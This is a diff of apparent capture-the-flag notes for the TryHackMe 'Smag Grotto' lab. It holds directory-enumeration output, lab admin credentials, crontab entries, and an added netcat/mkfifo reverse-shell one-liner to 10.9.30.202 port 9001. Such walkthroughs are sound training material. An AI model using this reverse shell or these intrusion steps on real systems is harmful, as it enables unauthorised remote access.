@@ -71,12 +71,11 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 + 
-┌──(duke㉿kali)-[~/Documents/THM_Smag_Grotto]
-└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://smag.thm -x .php, .txt, .html
-===============================================================
+┌─(duke㉿kali)-[~/Documents/THM_Smag_Grotto]
+└$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://smag.thm -x .php, .txt, .html
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
+
 [+] Url:                     http://smag.thm
 [+] Method:                  GET
 [+] Threads:                 10
@@ -85,9 +84,9 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 [+] User Agent:              gobuster/3.1.0
 [+] Extensions:              php,
 [+] Timeout:                 10s
-===============================================================
 2024/03/20 06:16:28 Starting gobuster in directory enumeration mode
-===============================================================
+
+
 /index.php            (Status: 200) [Size: 402]
 /mail                 (Status: 301) [Size: 303] [--> http://smag.thm/mail/]
 /server-status        (Status: 403) [Size: 273]                            
@@ -166,13 +165,16 @@ development             [Status: 200, Size: 1176, Words: 76, Lines: 18, Duration
 development             [Status: 200, Size: 1176, Words: 76, Lines: 18, Duration: 31ms]
 
 
+### Initial access
 #### login via http://development.smag.thm/admin.php use  username=helpdesk&password=cH4nG3M3_n0w
 
 run reverse shell
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.30.202 9001 >/tmp/f
+
 get access as www-date
 run linpease
 
-### Found in crontab
+#### Found in crontab
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
 25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
 47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
